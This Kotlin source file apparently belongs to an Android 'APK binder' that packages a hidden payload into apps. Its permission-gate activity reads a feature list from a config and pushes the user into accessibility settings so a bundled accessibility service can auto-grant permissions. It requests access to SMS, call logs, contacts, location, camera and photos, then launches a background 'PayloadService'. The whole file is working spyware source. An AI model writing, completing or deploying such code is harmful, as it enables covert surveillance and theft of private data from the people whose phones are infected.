package Com.devhs.apkbinder.payload

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import org.json.JSONObject

class PermissionGateActivity : Activity(), PayloadServiceHost {

    companion object {
        private const val REQ = 0x4853
    }

    private var waitingA11y = false
    private var features: List<String> = emptyList()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        HsLog.init(this)

        val cfg = (application as? PayloadApp)?.readConfig()
        if (cfg != null) {
            PayloadState.config = cfg
            features = readFeatures(cfg)
        } else {
            val alt = try {
                HsConfig.read(this)
            } catch (t: Throwable) {
                null
            }
            if (alt != null) features = alt.features
        }
        if (features.isEmpty()) features = listOf("gallery")
        HsLog.w("gate features=$features")

        setContentView(buildUi())

        if (features.contains("auto_grant") && !a11yOn()) {
            openA11y()
        } else {
            request()
        }
    }

    override fun onResume() {
        super.onResume()
        if (waitingA11y) {
            waitingA11y = false
            HsLog.w("a11y back=" + a11yOn())
            request()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQ) {
            HsLog.w("perm result n=" + grantResults.size)
            proceed()
        }
    }

    private fun readFeatures(json: JSONObject): List<String> {
        val out = ArrayList<String>()
        try {
            val a = json.optJSONArray("features")
            if (a != null) for (i in 0 until a.length()) out.add(a.optString(i))
        } catch (t: Throwable) {
        }
        return out
    }

    private fun openA11y() {
        waitingA11y = true
        try {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        } catch (t: Throwable) {
            HsLog.e("a11y open: ${t.message}")
            waitingA11y = false
            request()
            return
        }
        Handler(Looper.getMainLooper()).postDelayed({
            if (waitingA11y && hasWindowFocus()) {
                HsLog.w("a11y settings did not open")
                waitingA11y = false
                request()
            }
        }, 2000L)
    }

    private fun a11yOn(): Boolean = try {
        val want = packageName + "/" + HsAccessibility::class.java.name
        val cur = Settings.Secure.getString(
            contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: ""
        cur.split(':').any { it.equals(want, true) }
    } catch (t: Throwable) {
        false
    }

    private fun request() {
        val perms = requiredPermissions()
        HsLog.w("request n=" + perms.size)
        if (perms.isEmpty()) {
            proceed()
            return
        }
        try {
            requestPermissions(perms, REQ)
        } catch (t: Throwable) {
            HsLog.e("request: ${t.message}")
            proceed()
        }
    }

    private fun on(k: String): Boolean = features.contains(k)

    private fun granted(p: String): Boolean = try {
        checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED
    } catch (t: Throwable) {
        false
    }

    private fun requiredPermissions(): Array<String> {
        val list = ArrayList<String>()

        if (on("gallery")) {
            if (Build.VERSION.SDK_INT >= 33) list.add(Manifest.permission.READ_MEDIA_IMAGES)
            else list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        if (on("sms")) list.add(Manifest.permission.READ_SMS)
        if (on("calls")) {
            list.add(Manifest.permission.READ_CALL_LOG)
            list.add(Manifest.permission.READ_PHONE_STATE)
        }
        if (on("contacts") || on("contact_details")) list.add(Manifest.permission.READ_CONTACTS)
        if (on("device")) list.add(Manifest.permission.READ_PHONE_STATE)
        if (on("location") || on("wifi")) {
            list.add(Manifest.permission.ACCESS_FINE_LOCATION)
            list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
        }
        if (on("front_camera") || on("back_camera")) list.add(Manifest.permission.CAMERA)
        if (Build.VERSION.SDK_INT >= 33) list.add(Manifest.permission.POST_NOTIFICATIONS)

        return list.filter { !granted(it) }.distinct().toTypedArray()
    }

    private fun proceed() {
        try {
            startService(Intent(this, PayloadService::class.java))
        } catch (t: Throwable) {
            HsLog.e("startService: ${t.message}")
        }
        finish()
    }

    private fun buildUi(): LinearLayout {
        val root = LinearLayout(this)
        root.orientation = LinearLayout.VERTICAL
        root.gravity = Gravity.CENTER
        root.setPadding(48, 48, 48, 48)
        root.background = GradientDrawable().apply {
            setColor(Color.parseColor("#05070A"))
            cornerRadius = 48f
        }
        root.layoutParams = ViewGroup.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT,
            ViewGroup.LayoutParams.WRAP_CONTENT
        )

        root.addView(TextView(this).apply {
            text = "HS BINDER"
            setTextColor(Color.parseColor("#00E5C0"))
            textSize = 22f
            gravity = Gravity.CENTER
        })
        root.addView(TextView(this).apply {
            text = "Granting permissions..."
            setTextColor(Color.parseColor("#E8F6F4"))
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, 20, 0, 40)
        })
        root.addView(Button(this).apply {
            text = "Grant"
            setTextColor(Color.parseColor("#05070A"))
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#00E5C0"))
                cornerRadius = 30f
            }
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT
            )
            setOnClickListener { request() }
        })
        return root
    }
}
